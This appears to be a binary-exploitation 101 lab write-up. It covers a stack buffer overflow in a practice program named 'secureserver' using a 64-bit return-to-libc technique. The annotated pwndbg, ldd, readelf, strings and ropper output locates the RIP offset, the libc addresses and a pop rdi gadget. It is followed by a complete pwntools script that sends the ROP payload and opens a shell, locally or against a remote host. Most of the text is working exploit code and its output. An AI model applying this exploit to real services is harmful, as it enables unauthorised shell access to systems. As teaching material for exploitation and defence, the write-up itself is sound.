/*
pwn-example-secureserver-64bit-return to lib c

> file secure-server

aslr_off
find instruction pointer offset

gdb-pwndbg secure-server
cyclic(100)
copy
run
paste it in

64-bit/secureserver'
*RCX  0x7ffff7df6a80 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RDX  0x1
*RDI  0x7ffff7df8a20 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x1
*R8   0x405715 ◂— 0x0
 R9   0x0
*R10  0x1000
*R11  0x246
 R12  0x0
*R13  0x7fffffffc308 —▸ 0x7fffffffc7da ◂— 'SHELL=/bin/bash'
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffc1d8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
*RIP  0x401179 (receive_feedback+39) ◂— ret 
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401179 <receive_feedback+39>    ret    <0x616161616161616a>
 
 ──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x401179 <receive_feedback+39>    ret    <0x616161616161616a>










───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc1d8 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa'
01:0008│     0x7fffffffc1e0 ◂— 'kaaaaaaalaaaaaaamaaa'
02:0010│     0x7fffffffc1e8 ◂— 'laaaaaaamaaa'
03:0018│     0x7fffffffc1f0 ◂— 0x7f006161616d /* 'maaa' */
04:0020│     0x7fffffffc1f8 —▸ 0x40117a (main) ◂— push rbp
05:0028│     0x7fffffffc200 ◂— 0x100400040 /* '@' */
06:0030│     0x7fffffffc208 —▸ 0x7fffffffc2f8 —▸ 0x7fffffffc779 ◂— '/home/dylan/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc/64-bit/secureserver'
07:0038│     0x7fffffffc210 —▸ 0x7fffffffc2f8 —▸ 0x7fffffffc779 ◂— '/home/dylan/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc/64-bit/secureserver'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0         0x401179 receive_feedback+39
   f 1 0x616161616161616a
   f 2 0x616161616161616b
   f 3 0x616161616161616c
   f 4   0x7f006161616d
   f 5         0x40117a main
   f 6      0x100400040
   f 7   0x7fffffffc2f8
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
pwndbg> 

dylan@linuxOS:~/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc/64-bit$ ldd secureserver
	linux-vdso.so.1 (0x00007ffff7fc5000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fc7000)
dylan@linuxOS:~/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc/64-bit$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
  1023: 000000000004e520    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5


dylan@linuxOS:~/crypto-cat-ctf/CTF/pwn/binary_exploitation_101/06-return_to_libc/64-bit$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6  | grep "/bin/sh"
 1b61b4 /bin/sh
 
 ropper --file secureserver | grep rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000040108a: adc dword ptr [rax], eax; mov rdi, 0x40117a; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401087: mov ecx, 0x4011b0; mov rdi, 0x40117a; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x0000000000401086: mov rcx, 0x4011b0; mov rdi, 0x40117a; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040108d: mov rdi, 0x40117a; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040116a: mov rdi, rax; mov eax, 0; call 0x1040; nop; leave; ret; 
0x00000000004010c6: or dword ptr [rdi + 0x404048], edi; jmp rax; 
0x000000000040120b: pop rdi; ret; 
	
	
pwndbg> x 0x7ffff7c4e520
0x7ffff7c4e520 <__libc_system>: 0xfa1e0ff3
pwndbg> x 0x7ffff7c4e520 - 0x4e520 + 0x1b61b4
0x7ffff7db61b4: 0x6e69622f
pwndbg> x/s 0x7ffff7c4e520 - 0x4e520 + 0x1b61b4
0x7ffff7db61b4: "/bin/sh"
	
  */
  
  from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './secureserver'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# Lib-c offsets, found manually (ASLR_OFF)
libc_base = 0x00007ffff7c00000
system = libc_base + 0x4e520
binsh = libc_base + 0x1b61b4

# POP RDI gadget (found with ropper)
pop_rdi = 0x40120b

# How many bytes to the instruction pointer (RIP)?
padding = 72

payload = flat(
    asm('nop') * padding,  # Padding up to RIP
    pop_rdi,  # Pop the following address into the RDI register
    binsh,  # Address of /bin/sh in libc
    system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b':', payload)

# Get flag/shell
io.interactive()

